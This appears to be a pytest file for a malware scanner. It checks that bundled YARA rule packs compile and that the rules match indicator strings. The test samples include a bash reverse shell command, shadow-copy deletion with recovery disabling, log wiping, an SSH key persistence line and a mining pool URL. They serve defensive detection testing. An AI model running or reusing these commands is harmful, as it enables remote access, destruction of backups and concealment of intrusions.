"""Guard tests for the bundled YARA rules.

The YARA analyzer falls back to per-file compilation, which means a malformed
*bundled* rule file is silently dropped rather than raising. That is the right
behaviour for untrusted third-party rule trees, but it can hide bugs in our own
shipped rules. These tests fail loudly if any bundled pack stops compiling.

Skipped when yara-python is not installed (e.g. on the core CI matrix).
"""

from __future__ import annotations

import glob
import os

import pytest

yara = pytest.importorskip("yara")

_RULES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                          "hawkscan", "rules")


def _rule_files():
    return sorted(glob.glob(os.path.join(_RULES_DIR, "*.yar")) +
                  glob.glob(os.path.join(_RULES_DIR, "*.yara")))


def test_bundled_rule_files_exist():
    assert _rule_files(), "no bundled rule files found"


@pytest.mark.parametrize("path", _rule_files(),
                         ids=lambda p: os.path.basename(p))
def test_each_bundled_pack_compiles(path):
    # Raises yara.SyntaxError on unreferenced strings / syntax errors.
    yara.compile(filepath=path)


def test_all_bundled_packs_compile_together():
    sources = {os.path.basename(p): p for p in _rule_files()}
    yara.compile(filepaths=sources)


def test_stealers_pack_detects_and_no_fp():
    rules = yara.compile(
        filepath=os.path.join(_RULES_DIR, "hawkscan_stealers.yar"))

    def hit(data):
        return {m.rule for m in rules.match(data=data)}

    # 0x5c = backslash; build the real named-pipe path unambiguously.
    bs = b"\x5c"
    pipe = bs + bs + b".\x5cpipe\x5cmsagent_7f3a"
    assert "HawkScan_CobaltStrike_Beacon_Indicators" in hit(b"x " + pipe + b" y")
    assert "HawkScan_CobaltStrike_Beacon_Indicators" in hit(
        b"ReflectiveLoader ... beacon.dll")
    assert "HawkScan_Infostealer_BrowserCredentialTheft" in hit(
        b"\x5cGoogle\x5cChrome\x5cUser Data Login Data Local State wallet.dat")
    assert "HawkScan_Clipboard_CryptoClipper" in hit(
        b"OpenClipboard GetClipboardData SetClipboardData "
        b"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    assert "HawkScan_Shellcode_Loader_InjectionTriad" in hit(
        b"MZ\x90\x00 VirtualAllocEx WriteProcessMemory CreateRemoteThread")
    assert "HawkScan_Keylogger_LogFormat" in hit(
        b"[ENTER][BACKSPACE][TAB] GetAsyncKeyState")
    assert "HawkScan_DotNet_RAT_Markers" in hit(
        b"AsyncClient Server Certificate DoProcessKill")
    # Benign prose must not match any stealer rule.
    assert hit(b"A normal note about chrome browsers and clipboards.") == set()


def test_ransomware_pack_detects_and_no_fp():
    rules = yara.compile(
        filepath=os.path.join(_RULES_DIR, "hawkscan_ransomware.yar"))

    def hit(data):
        return {m.rule for m in rules.match(data=data)}

    assert "HawkScan_Ransomware_RecoveryTampering" in hit(
        b"cmd /c vssadmin delete shadows /all /quiet & bcdedit /set "
        b"recoveryenabled no")
    assert "HawkScan_Ransomware_FamilyArtifacts" in hit(
        b"drop @WanaDecryptor@.exe and rename to .wncry")
    assert "HawkScan_Ransomware_EncryptionBehavior" in hit(
        b"CryptGenKey FindFirstFile your files have been encrypted .onion")
    assert "HawkScan_Cryptominer_StratumPool" in hit(
        b"pool stratum+tcp://xmr.pool.example:3333 user wallet")
    # Benign prose must not match.
    assert hit(b"A guide to backups and file encryption best practices.") == set()


def test_linux_threats_pack_detects_and_no_fp():
    rules = yara.compile(
        filepath=os.path.join(_RULES_DIR, "hawkscan_linux_threats.yar"))

    def hit(data):
        return {m.rule for m in rules.match(data=data)}

    assert "HawkScan_Linux_Botnet_MiraiGafgyt" in hit(
        b"\x7fELF junk TSource Engine Query more")
    assert "HawkScan_Linux_ReverseShell" in hit(
        b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert "HawkScan_Linux_AntiForensics_LogWipe" in hit(
        b"unset HISTFILE; rm -f /var/log/wtmp /var/log/btmp")
    assert "HawkScan_Linux_Persistence_Implant" in hit(
        b"echo 'ssh-rsa AAAAB3Nz...' >> ~/.ssh/authorized_keys")
    # Benign admin/firmware text must not match.
    assert hit(b"This BusyBox firmware mounts /dev and starts the watchdog.") == set()
    assert hit(b"Backup script: curl https://host/file and chmod +x it later.") == set()
